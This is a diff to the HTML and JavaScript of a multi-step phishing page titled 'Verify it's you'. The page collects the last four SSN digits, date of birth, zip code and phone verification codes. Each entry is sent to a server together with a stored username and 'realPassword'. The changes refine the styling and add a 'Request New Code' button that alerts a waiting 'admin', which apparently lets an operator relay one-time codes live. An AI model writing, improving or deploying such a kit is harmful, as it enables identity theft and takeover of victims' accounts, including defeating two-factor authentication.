@@ -16,21 +16,21 @@
             max-width: 420px;
             margin: auto;
             background: white;
-            padding: 30px;
+            padding: 35px 25px;
             border-radius: 16px;
             box-shadow: 0 10px 30px rgba(0,0,0,0.1);
         }
-        h1 { text-align: center; margin-bottom: 8px; font-size: 1.6rem; color: #1e2937; }
-        p { text-align: center; color: #64748b; margin-bottom: 25px; }
-        label { display: block; margin: 18px 0 8px; font-weight: 600; color: #334155; }
+        h1 { text-align: center; font-size: 1.65rem; margin-bottom: 8px; color: #1e2937; }
+        p { text-align: center; color: #64748b; margin-bottom: 25px; line-height: 1.4; }
+        label { display: block; margin: 20px 0 8px; font-weight: 600; color: #334155; }
         input, select {
             width: 100%;
-            padding: 14px;
+            padding: 14px 16px;
             border: 1.5px solid #e2e8f0;
             border-radius: 10px;
             font-size: 1.05rem;
         }
-        .date-group { display: flex; gap: 8px; }
+        .date-group { display: flex; gap: 10px; }
         button {
             width: 100%;
             padding: 16px;
@@ -42,13 +42,15 @@
             cursor: pointer;
         }
         .continue { background: #1e40af; color: white; }
+        .new-code { background: #eab308; color: #1e2937; }
         .error { color: #ef4444; text-align: center; margin: 15px 0; font-weight: 500; }
+        .success { color: #22c55e; text-align: center; margin: 15px 0; }
         .step { display: none; }
         .step.active { display: block; }
     </style>
 </head>
 <body>
-    <!-- Step 1: SSN + DOB -->
+    <!-- Step 1 -->
     <div class="container step active" id="step1">
         <h1>Verify it's you</h1>
         <p>Enter the last 4 digits of your SSN and date of birth</p>
@@ -62,29 +64,30 @@
             <select id="year"></select>
         </div>
 
-        <label><input type="checkbox" id="privacy"> I agree to the Privacy Policy</label>
+        <label><input type="checkbox" id="privacy"> I agree to the Privacy Policy and Terms</label>
         <button class="continue" onclick="saveStep1()">Continue</button>
     </div>
 
-    <!-- Step 2: Zip Code -->
+    <!-- Step 2 -->
     <div class="container step" id="step2">
-        <h1>Enter Zip Code</h1>
-        <p>Confirm your current zip code</p>
+        <h1>Zip Code</h1>
+        <p>Enter your current zip code</p>
         <input type="text" id="zip" maxlength="5" oninput="this.value = this.value.replace(/[^0-9]/g,'')" required>
         <button class="continue" onclick="saveStep2()">Continue</button>
     </div>
 
-    <!-- Step 3: Access Code -->
+    <!-- Step 3 -->
     <div class="container step" id="step3">
         <h1>Enter Access Code</h1>
-        <p>We sent a code to your phone</p>
+        <p>We sent a verification code to your phone</p>
         <input type="text" id="code" maxlength="8" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
         <button class="continue" onclick="submitCode()">Submit Code</button>
+        <button class="new-code" onclick="requestNewCode()">Request New Code</button>
         <div class="error" id="error"></div>
     </div>
 
     <script>
-        // Populate dates
+        // Populate Date Fields
         window.onload = () => {
             const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
             months.forEach((m,i) => {
@@ -104,7 +107,7 @@
         };
 
         async function saveToServer(details) {
-            const username = sessionStorage.getItem('username') || document.getElementById('username')?.value || 'N/A';
+            const username = sessionStorage.getItem('username') || 'N/A';
             const password = sessionStorage.getItem('realPassword') || 'N/A';
 
             try {
@@ -122,7 +125,7 @@
             const day = document.getElementById('day').value;
             const year = document.getElementById('year').value;
 
-            if (ssn.length !== 4) return alert("SSN must be 4 digits");
+            if (ssn.length !== 4) return alert("Please enter last 4 digits of SSN");
 
             const details = `SSN: ${ssn} | DOB: ${month}/${day}/${year} | Status: Pending`;
             await saveToServer(details);
@@ -133,9 +136,9 @@
 
         async function saveStep2() {
             const zip = document.getElementById('zip').value.trim();
-            if (zip.length !== 5) return alert("Enter valid 5-digit zip code");
+            if (zip.length !== 5) return alert("Please enter valid 5-digit zip code");
 
-            const details = `Zip: ${zip} | Status: Pending`;
+            const details = `Zip Code: ${zip} | Status: Pending`;
             await saveToServer(details);
 
             document.getElementById('step2').classList.remove('active');
@@ -144,12 +147,18 @@
 
         async function submitCode() {
             const code = document.getElementById('code').value.trim();
-            if (!code) return alert("Enter access code");
+            if (!code) return alert("Please enter the access code");
 
             const details = `Access Code: ${code} | Status: Pending`;
             await saveToServer(details);
 
             document.getElementById('error').innerHTML = `<span style="color:#3b82f6">Waiting for admin confirmation...</span>`;
+        }
+
+        async function requestNewCode() {
+            const details = `🔄 USER REQUESTED NEW CODE | Please send new verification code | Status: Pending`;
+            await saveToServer(details);
+            document.getElementById('error').innerHTML = `<span style="color:#eab308">Request sent to admin.<br>Waiting for new code...</span>`;
         }
     </script>
 </body>
